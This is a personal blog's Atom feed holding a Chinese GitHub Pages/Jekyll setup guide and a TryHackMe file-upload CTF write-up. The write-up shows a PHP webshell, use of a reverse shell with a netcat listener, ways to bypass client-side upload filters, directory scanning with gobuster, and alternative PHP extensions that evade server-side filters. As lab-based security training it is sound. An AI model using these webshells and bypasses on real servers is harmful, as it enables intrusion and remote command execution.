<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-25T18:10:45+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lemonxym’ page</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Github+jekyll+minimal Mistakes 环境搭建</title><link href="http://localhost:4000/2022/05/25/github+jekyll+minimal-mistakes-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html" rel="alternate" type="text/html" title="Github+jekyll+minimal Mistakes 环境搭建" /><published>2022-05-25T00:00:00+08:00</published><updated>2022-05-25T00:00:00+08:00</updated><id>http://localhost:4000/2022/05/25/github+jekyll+minimal-mistakes%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</id><content type="html" xml:base="http://localhost:4000/2022/05/25/github+jekyll+minimal-mistakes-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html">&lt;h1 id=&quot;博客&quot;&gt;博客&lt;/h1&gt;

&lt;h2 id=&quot;jekyll--github-pages&quot;&gt;jekyll + github pages&lt;/h2&gt;

&lt;p&gt;假设你已经预先有了git pages对应的仓库，即&lt;username&gt;.github.io，所有一切都是直接在github线上使用的。&lt;/username&gt;&lt;/p&gt;

&lt;p&gt;参考资料：&lt;/p&gt;

&lt;p&gt;https://docs.github.com/en/pages/setting-up-a-github-pages-site-with-jekyll&lt;/p&gt;

&lt;p&gt;https://docs.github.com/en/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll&lt;/p&gt;

&lt;p&gt;https://jekyllrb.com/docs/&lt;/p&gt;

&lt;p&gt;https://gist.github.com/widdowquinn/f255783f826f358f5de97186131419a9&lt;/p&gt;

&lt;p&gt;永远要听话看官方文档&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;安装ruby和bundler&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;安装ruby好像用安装包就可以了&lt;/p&gt;

&lt;p&gt;安装bundler&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gem install bundler jekyll
# 用ruby的gem命令安装bundler，bundler可以用来管理ruby项目的gem依赖
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220524193604680.png&quot; alt=&quot;image-20220524193604680&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;用命令行先建立一个本地仓库（github的文档里有在仓库内某一个文件夹内存放jekyll项目代码的方法，这里只是默认放在仓库内的根目录下）&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir blog

git init
# 初始化git项目

cd blog

jekyll new --skip-bundle .
# 创建jekyll网站
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打开当前目录下的Gemfile文件&lt;/p&gt;

&lt;p&gt;注释掉jekyll的版本号那一行，并且修改版本号，我现在是226，版本号在https://pages.github.com/versions/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220524194648145.png&quot; alt=&quot;image-20220524194648145&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后命令行运行&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;！！踩坑：&lt;/p&gt;

&lt;p&gt;官方文档第九点看漏了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220524194816720.png&quot; alt=&quot;image-20220524194816720&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后就有了这个报错…（只要记得把Gemfile里jekyll版本号注释掉就好）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220524194940872.png&quot; alt=&quot;image-20220524194940872&quot; /&gt;&lt;/p&gt;

&lt;p&gt;回到原来的话题&lt;/p&gt;

&lt;p&gt;建议用这个命令先本地启动一下jekyll项目试试看&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle exec jekyll serve
# 要先bundle add webrick，不然运行不了，详细见https://jekyllrb.com/docs/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;启动以后在http://localhost:4000看&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;commit修改&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这里充分暴露了我对github不熟悉的短板，看了一遍又一遍，还是记不住clone、push、pull…建议不太熟还是用github客户端，不建议用命令行。&lt;/p&gt;

&lt;p&gt;！！踩坑：&lt;/p&gt;

&lt;p&gt;不知道是不是因为现在github属于微软了，main变成了默认分支。在线上仓库里，我的代码是放在main分支的，但是在我本地仓库里（在他们俩还没有建立关联的时候），我是放在master分支的（这个原因也未明，当时用了bundle init命令也有可能我用的git init时电脑里git的版本太老了？）。&lt;/p&gt;

&lt;p&gt;commit修改以后，到线上仓库那里去pull requests，结果它说没有可以对比的地方。后来一通乱找，在错误的路上越走越远。&lt;/p&gt;

&lt;p&gt;最后才想到切换分支就好了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220524195819447.png&quot; alt=&quot;image-20220524195819447&quot; /&gt;&lt;/p&gt;

&lt;p&gt;学了这么多年，甚至没有对git熟悉，更别提熟悉它的原理了，学校里那套和社会很脱节，确实有点失败吧，但是现在开始好好做就好。&lt;/p&gt;

&lt;p&gt;回到原话题，在同一个分支commit修改就好。&lt;/p&gt;

&lt;p&gt;打开https://&lt;username&gt;.github.io/就可以看到修改了&lt;/username&gt;&lt;/p&gt;

&lt;h2 id=&quot;改主题minimal-mistakes&quot;&gt;改主题（minimal mistakes）&lt;/h2&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/&lt;/p&gt;

&lt;p&gt;有两种方法：gem-based method和remote theme method&lt;/p&gt;

&lt;p&gt;如果用gem-based method就等于让minimal-mistakes-jekyll 这个gem来帮你管理这个网站，很多相关文件都放在那个gem的目录下，而不放在当前这个项目myblog下。这样本地的myblog commit到&lt;username&gt;.github.io仓库上是没办法用的&lt;/username&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220525083427320.png&quot; alt=&quot;image-20220525083427320&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以用remote theme method。&lt;/p&gt;

&lt;p&gt;第一步这个创建或替换Gemfile内容，纠结了半天是要整个替换？我自己的做法是复制粘贴，但是注意和原文件重复了的行留一行就好。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220525083802790.png&quot; alt=&quot;image-20220525083802790&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其他按他说的做就好，没啥问题&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220525084046786.png&quot; alt=&quot;image-20220525084046786&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;坑带图片的markdown-post&quot;&gt;坑：带图片的markdown post&lt;/h2&gt;

&lt;p&gt;上传post后图片不显示，我写的是绝对路径，图片文件夹放在_post/attachments里，后来用了相对路径，也不行。&lt;/p&gt;

&lt;p&gt;看到minimal mistakes的作者说&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220525102130024.png&quot; alt=&quot;image-20220525102130024&quot; /&gt;&lt;/p&gt;

&lt;p&gt;放到了/assets/images文件夹里，用相对路径用绝对路径都不行，非得加上一个http://localhost:4000才行。&lt;/p&gt;

&lt;p&gt;minimal mistakes支持的是kramdown：https://www.fabriziomusacchio.com/blog/2021-08-11-Minimal_Mistakes_Cheat_Sheet/#via-markdown，但是typora不支持kramdown&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-25-github+jekyll+minimal-mistakes 环境搭建/image-20220525102637334.png&quot; alt=&quot;image-20220525102637334&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也就是每次写完还得手动改，加上http://localhost:4000，加上之后本地用typora又看不了，还得复制两份。想着要不换主题吧，但是minimal mistakes的文档最齐全…&lt;/p&gt;

&lt;p&gt;github pages支持kramdown和GFM两种markdown，typora也支持后者，也尝试了修改项目的markdown：https://docs.github.com/en/pages/setting-up-a-github-pages-site-with-jekyll/setting-a-markdown-processor-for-your-github-pages-site-using-jekyll，没用。&lt;/p&gt;

&lt;p&gt;如果是我资料查漏了，请告诉我，感激不尽。&lt;/p&gt;</content><author><name>lemonxym</name></author><summary type="html">博客</summary></entry><entry><title type="html">Tryhackme “Upload Vulnerabilities” Challenge</title><link href="http://localhost:4000/2022/05/25/Tryhackme-Upload-Vulnerability-big-task.html" rel="alternate" type="text/html" title="Tryhackme “Upload Vulnerabilities” Challenge" /><published>2022-05-25T00:00:00+08:00</published><updated>2022-05-25T00:00:00+08:00</updated><id>http://localhost:4000/2022/05/25/Tryhackme%20Upload%20Vulnerability%20big%20task</id><content type="html" xml:base="http://localhost:4000/2022/05/25/Tryhackme-Upload-Vulnerability-big-task.html"></content><author><name>lemonxym</name></author><summary type="html"></summary></entry><entry><title type="html">File Upload Wp</title><link href="http://localhost:4000/2022/05/16/file-upload-wp.html" rel="alternate" type="text/html" title="File Upload Wp" /><published>2022-05-16T00:00:00+08:00</published><updated>2022-05-16T00:00:00+08:00</updated><id>http://localhost:4000/2022/05/16/file-upload-wp</id><content type="html" xml:base="http://localhost:4000/2022/05/16/file-upload-wp.html">&lt;h1 id=&quot;文件上传绕过client-side&quot;&gt;文件上传绕过（client-side）&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 7&lt;/p&gt;

&lt;p&gt;已知http://java.uploadvulns.thm（PS：需要在/etc/hosts中设置IP和域名对应）只存在client-side的文件上传过滤，目标是得到该服务器/var/www/下的flag&lt;/p&gt;

&lt;p&gt;打开网页如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516095801615.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为是client-side的过滤故查看源代码，发现非png类型文件不可上传&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516100025617.png&quot; alt=&quot;image-20220516100025617&quot; /&gt;&lt;/p&gt;

&lt;p&gt;整个流程是用户请求网页，然后服务器返回网页信息（html等等信息），其中包含了上面用于过滤文件类型的JavaScript代码。然后点击“select file”打开文件后，过滤代码就在用户端运行。点击上传，文件就传输到服务器。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516102207195.png&quot; alt=&quot;image-20220516102207195&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我们可以用两种方法来打破client-side过滤的机制：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;在服务器返回网页信息的时候截胡，把过滤代码删掉&lt;/li&gt;
  &lt;li&gt;在过滤代码执行的时候处理，上传一个png后缀文件，但在执行结果返回前把文件类型改回来&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;可以用webshell或者reverse shell：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;webshell我用的是以下代码&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
	echo system($_GET[&quot;cmd&quot;]);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;reverse shell用的是kali的/usr/share/webshells/php/php-reverse-shell.php（记得改文件里的$IP为攻击机的IP）&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;以上的2X2种方法可以随便组合&lt;/p&gt;

&lt;h2 id=&quot;方法一删过滤代码webshell&quot;&gt;方法一：删过滤代码+webshell&lt;/h2&gt;

&lt;p&gt;打开网页代理，打开burpsuite，选择response to this request来显示服务器返回的包（默认情况下不显示）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516105740620.png&quot; alt=&quot;image-20220516105740620&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击forward，收到返回的包，删除过滤的js代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516105947436.png&quot; alt=&quot;image-20220516105947436&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击forward后，正常上传文件即可&lt;/p&gt;

&lt;p&gt;问题是不知道webshell.php在哪，所以用gobuster扫一下文件目录：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到一个可疑的文件夹/images，访问这个文件夹：http://java.uploadvulns.thm/images果然在里面，所以只要访问&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://java.uploadvulns.thm/images/webshell.php?cmd=cat /var/www/flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;方法二修改文件类型reverse-shell&quot;&gt;方法二：修改文件类型+reverse shell&lt;/h2&gt;

&lt;p&gt;把php-reverse-shell.php改成shell.png(改成shell只是懒得打，但是后缀一定要改)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516110903950.png&quot; alt=&quot;image-20220516110903950&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击“upload”，修改文件类型，点击forward成功上传&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516111059415.png&quot; alt=&quot;image-20220516111059415&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也是一样的用gobuster找到文件上传到何处&lt;/p&gt;

&lt;p&gt;攻击机这边打开netcat的listener，然后访问&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvnp 1234(端口号)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获得reverse shell，得到flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516111412502.png&quot; alt=&quot;image-20220516111412502&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;文件上传绕过server-side-文件拓展名过滤&quot;&gt;文件上传绕过（server-side）-文件拓展名过滤&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 8&lt;/p&gt;

&lt;p&gt;后缀改成php5就可以上传了，以下是一些很少使用但服务器或许可以识别的Php后缀名，一个个试出来的：.php3, .php4, .php5, .php7, .phps, .php-s,  .pht .phar。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/2022-05-16-file-upload-wp/image-20220516152831391.png&quot; alt=&quot;image-20220516152831391&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;文件上传绕过server-side-magic-numbers过滤&quot;&gt;文件上传绕过（server-side）-magic numbers过滤&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 9&lt;/p&gt;</content><author><name>lemonxym</name></author><summary type="html">文件上传绕过（client-side）</summary></entry></feed>